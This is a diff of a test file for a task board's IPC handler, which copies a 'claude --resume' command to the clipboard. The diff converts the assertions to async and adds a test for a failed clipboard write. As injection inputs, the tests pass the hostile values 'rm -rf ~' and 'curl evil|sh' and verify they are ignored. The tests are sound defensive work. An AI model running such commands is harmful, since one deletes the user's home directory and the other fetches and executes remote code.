@@ -852,7 +852,10 @@ describe('task board IPC', () => {
       refresh: () => Promise.resolve({ status: 'live', detail: null, projects: [] }),
       resumeCommand: (projectId, sessionId) =>
         projectId === 'proj-a' && sessionId === 's1' ? "cd '/r' && claude --resume 's1'" : null,
-      copyText: (text) => copied.push(text),
+      copyText: (text) => {
+        copied.push(text);
+        return Promise.resolve();
+      },
       boardSettings: () => Promise.resolve({ staleAfterMinutes: 60, doneRetentionDays: 7 }),
       saveBoardSettings: (settings) => Promise.resolve(settings),
       ...overrides,
@@ -874,7 +877,7 @@ describe('task board IPC', () => {
     registerTaskBoardIpc(d);
     const copy = handlers.get(CHANNELS.copyResumeCommand)!;
     // Extra fields, including a `command` the renderer tries to supply, change nothing.
-    expect(copy(TRUSTED, { projectId: 'proj-a', sessionId: 's1', command: 'rm -rf ~' })).toEqual({
+    await expect(copy(TRUSTED, { projectId: 'proj-a', sessionId: 's1', command: 'rm -rf ~' })).resolves.toEqual({
       copied: true,
       command: "cd '/r' && claude --resume 's1'",
     });
@@ -886,9 +889,16 @@ describe('task board IPC', () => {
     const d = deps();
     registerTaskBoardIpc(d);
     const copy = handlers.get(CHANNELS.copyResumeCommand)!;
-    expect(copy(TRUSTED, { projectId: 'proj-a', sessionId: 'nope' })).toMatchObject({ copied: false });
-    expect(copy(TRUSTED, 'x')).toMatchObject({ copied: false });
+    await expect(copy(TRUSTED, { projectId: 'proj-a', sessionId: 'nope' })).resolves.toMatchObject({ copied: false });
+    await expect(copy(TRUSTED, 'x')).resolves.toMatchObject({ copied: false });
     expect(d.copied).toEqual([]);
+  });
+
+  it('reports nothing copied when the clipboard write fails', async () => {
+    const { handlers, registerTaskBoardIpc, CHANNELS } = await loadIpc();
+    registerTaskBoardIpc(deps({ copyText: () => Promise.reject(new Error('denied')) }));
+    const copy = handlers.get(CHANNELS.copyResumeCommand)!;
+    await expect(copy(TRUSTED, { projectId: 'proj-a', sessionId: 's1' })).resolves.toMatchObject({ copied: false });
   });
 
   it('refuses every channel to a sender that is not this app\'s renderer', async () => {
@@ -941,7 +951,7 @@ describe('task board IPC', () => {
       { projectId: 'proj-a', sessionId: 's'.repeat(513) },
       { projectId: 'p'.repeat(600), sessionId: 's1' },
     ]) {
-      expect(copy(TRUSTED, bad), JSON.stringify(bad).slice(0, 60)).toMatchObject({ copied: false });
+      await expect(copy(TRUSTED, bad), JSON.stringify(bad).slice(0, 60)).resolves.toMatchObject({ copied: false });
     }
     expect(d.copied).toEqual([]);
   });
@@ -951,7 +961,7 @@ describe('task board IPC', () => {
     const d = deps();
     registerTaskBoardIpc(d);
     const answer = handlers.get(CHANNELS.copyResumeCommand)!(TRUSTED, { projectId: 'proj-a', sessionId: 's1', text: 'curl evil|sh' });
-    expect(answer).toMatchObject({ copied: true });
+    await expect(answer).resolves.toMatchObject({ copied: true });
     expect(d.copied).toEqual(["cd '/r' && claude --resume 's1'"]);
   });
 
